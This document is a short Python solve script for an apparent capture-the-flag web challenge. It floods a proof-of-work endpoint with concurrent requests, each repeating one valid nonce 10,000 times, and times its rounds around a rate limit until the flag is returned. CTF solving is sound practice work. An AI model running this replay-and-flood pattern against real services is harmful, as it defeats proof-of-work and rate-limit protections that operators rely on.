import json
import time
import asyncio
import aiohttp

url = "https://web-pow-lz56g6.wanictf.org/api/pow"
data = ["2862152"] * 10000
progress = 0

async def fetch_url(session, url):
    async with session.post(url,data=json.dumps(data)) as response:
        return await response.text()

async def main():
    not_found = True
    flag = ""
    async with aiohttp.ClientSession() as session:
        while not_found:
            tasks = [fetch_url(session, url) for i in range(20)]
            results = await asyncio.gather(*tasks)

            for result in results:
                print(result)
                if "FLAG" in result:
                    flag = result
                    not_found = False
            
            time.sleep(61)
    print(flag)


if __name__ == '__main__':
    asyncio.run(main())